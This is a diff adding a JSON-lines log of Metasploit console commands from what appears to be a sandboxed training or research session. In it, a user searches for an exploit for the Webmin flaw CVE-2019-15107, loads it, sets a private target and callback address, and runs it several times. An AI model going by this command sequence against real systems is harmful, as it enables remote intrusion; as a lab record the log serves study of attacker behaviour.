@@ -1,0 +1,27 @@
+{"sandbox_id": "185", "timestamp_str": "2019-12-12T10:28:27.0+02:00", "cmd_type": "msf-command", "cmd": "help"}
+{"sandbox_id": "185", "timestamp_str": "2019-12-12T10:30:38.0+02:00", "cmd_type": "msf-command", "cmd": "show"}
+{"sandbox_id": "185", "timestamp_str": "2019-12-12T10:30:49.0+02:00", "cmd_type": "msf-command", "cmd": "help"}
+{"sandbox_id": "185", "timestamp_str": "2019-12-12T10:31:39.0+02:00", "cmd_type": "msf-command", "cmd": "search remote"}
+{"sandbox_id": "185", "timestamp_str": "2019-12-12T10:32:45.0+02:00", "cmd_type": "msf-command", "cmd": "search remote code execution"}
+{"sandbox_id": "185", "timestamp_str": "2019-12-12T10:34:18.0+02:00", "cmd_type": "msf-command", "cmd": "search webmin"}
+{"sandbox_id": "185", "timestamp_str": "2019-12-12T10:35:00.0+02:00", "cmd_type": "msf-command", "cmd": "help"}
+{"sandbox_id": "185", "timestamp_str": "2019-12-12T10:35:20.0+02:00", "cmd_type": "msf-command", "cmd": "help search"}
+{"sandbox_id": "185", "timestamp_str": "2019-12-12T10:36:32.0+02:00", "cmd_type": "msf-command", "cmd": "search cve 2019-15107"}
+{"sandbox_id": "185", "timestamp_str": "2019-12-12T10:37:02.0+02:00", "cmd_type": "msf-command", "cmd": "search cve 2019-15107 type exploit"}
+{"sandbox_id": "185", "timestamp_str": "2019-12-12T10:37:09.0+02:00", "cmd_type": "msf-command", "cmd": "help search"}
+{"sandbox_id": "185", "timestamp_str": "2019-12-12T10:38:03.0+02:00", "cmd_type": "msf-command", "cmd": "search cve 2019-15107 type exploit name webmin platform unix"}
+{"sandbox_id": "185", "timestamp_str": "2019-12-12T10:38:15.0+02:00", "cmd_type": "msf-command", "cmd": "help search"}
+{"sandbox_id": "185", "timestamp_str": "2019-12-12T10:39:24.0+02:00", "cmd_type": "msf-command", "cmd": "search name webmin"}
+{"sandbox_id": "185", "timestamp_str": "2019-12-12T10:39:32.0+02:00", "cmd_type": "msf-command", "cmd": "help search"}
+{"sandbox_id": "185", "timestamp_str": "2019-12-12T10:40:02.0+02:00", "cmd_type": "msf-command", "cmd": "search webmin"}
+{"sandbox_id": "185", "timestamp_str": "2019-12-12T10:40:22.0+02:00", "cmd_type": "msf-command", "cmd": "help"}
+{"sandbox_id": "185", "timestamp_str": "2019-12-12T10:41:14.0+02:00", "cmd_type": "msf-command", "cmd": "use exploit/47230"}
+{"sandbox_id": "185", "timestamp_str": "2019-12-12T10:41:17.0+02:00", "cmd_type": "msf-command", "cmd": "help"}
+{"sandbox_id": "185", "timestamp_str": "2019-12-12T10:41:26.0+02:00", "cmd_type": "msf-command", "cmd": "help exploit"}
+{"sandbox_id": "185", "timestamp_str": "2019-12-12T10:42:25.0+02:00", "cmd_type": "msf-command", "cmd": "exploit -t 172.18.1.5"}
+{"sandbox_id": "185", "timestamp_str": "2019-12-12T10:43:02.0+02:00", "cmd_type": "msf-command", "cmd": "options"}
+{"sandbox_id": "185", "timestamp_str": "2019-12-12T10:43:32.0+02:00", "cmd_type": "msf-command", "cmd": "set RHOST 172.18.1.5"}
+{"sandbox_id": "185", "timestamp_str": "2019-12-12T10:43:42.0+02:00", "cmd_type": "msf-command", "cmd": "exploit"}
+{"sandbox_id": "185", "timestamp_str": "2019-12-12T10:44:22.0+02:00", "cmd_type": "msf-command", "cmd": "set LHOST 127.0.0.1"}
+{"sandbox_id": "185", "timestamp_str": "2019-12-12T10:44:29.0+02:00", "cmd_type": "msf-command", "cmd": "exploit"}
+{"sandbox_id": "185", "timestamp_str": "2019-12-12T10:45:31.0+02:00", "cmd_type": "msf-command", "cmd": "set LHOST 10.1.135.83"}
